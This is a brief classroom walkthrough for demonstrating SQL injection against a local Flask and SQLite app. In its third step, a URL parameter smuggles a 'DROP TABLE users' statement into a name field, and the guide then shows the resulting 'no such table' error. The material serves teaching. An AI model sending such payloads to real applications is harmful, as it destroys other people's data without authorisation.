How to Demonstrate in Class
1. Add a normal user
http://127.0.0.1:5000/add?name=Alice

2. Confirm table exists
http://127.0.0.1:5000/show

3. Perform the SQL Injection
http://127.0.0.1:5000/add?name=test'); DROP TABLE users; --

4. Check table again
http://127.0.0.1:5000/show

You will see something like:

Error: no such table: users

Full DROP TABLE SQL injection demonstrated using only SQLite.
